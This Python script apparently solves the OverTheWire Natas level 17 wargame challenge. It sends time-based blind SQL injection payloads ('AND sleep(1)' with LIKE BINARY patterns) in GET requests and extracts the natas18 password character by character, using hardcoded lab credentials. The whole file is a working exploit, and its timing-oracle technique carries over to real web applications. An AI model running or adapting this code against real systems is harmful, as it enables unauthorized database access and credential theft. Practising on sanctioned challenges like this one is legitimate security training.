#!/bin/python
# A better one for interogating the server
#                            notice!
# As we are exploiting time base sqli The internet connection 
# speed might affect the latency of the response so adjusting 
# the time is important!
import requests,string
import sys

url = 'http://natas17.natas.labs.overthewire.org'
auth_username = 'natas17'
auth_password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
characters = string.ascii_letters+string.digits

password_dictionary = ''

# we used get requests we can also use post

for char in characters:
    uri = url+'?username=natas18"+AND+password+LIKE+BINARY+%27%25'+char+'%25%27+AND+sleep(1)+--+'
    r = requests.get(uri, auth=(auth_username,auth_password))
    if r.elapsed.total_seconds()>=1:
        password_dictionary = password_dictionary + char
        print(password_dictionary)

password = ''
for i in range(1,32):
    for char in password_dictionary:
        uri = url+'?username=natas18"+AND+password+LIKE+BINARY+%27'+password+char+'%25%27+AND+sleep(1)+--+'
        r = requests.get(uri, auth=(auth_username,auth_password))
        if r.elapsed.total_seconds()>=1:
            password = password + char
            print(password)
            break
